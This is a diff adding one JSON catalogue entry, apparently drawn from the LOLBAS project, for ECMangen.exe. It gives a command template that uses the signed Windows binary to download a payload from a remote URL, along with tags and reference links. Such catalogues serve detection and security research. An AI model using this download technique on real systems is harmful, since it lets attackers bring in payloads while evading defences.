@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-ecmangen-exe-download",
+  "name": "LOLBAS · ECMangen.exe (Download)",
+  "command": "ECMangen.exe {REMOTEURL}",
+  "description": "Downloads payload from remote server",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "ecmangen",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/ECMangen/",
+  "upstream_id": "ECMangen.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — ECMangen.exe",
+      "url": "https://lolbas-project.github.io/lolbas/ECMangen/"
+    }
+  ]
+}
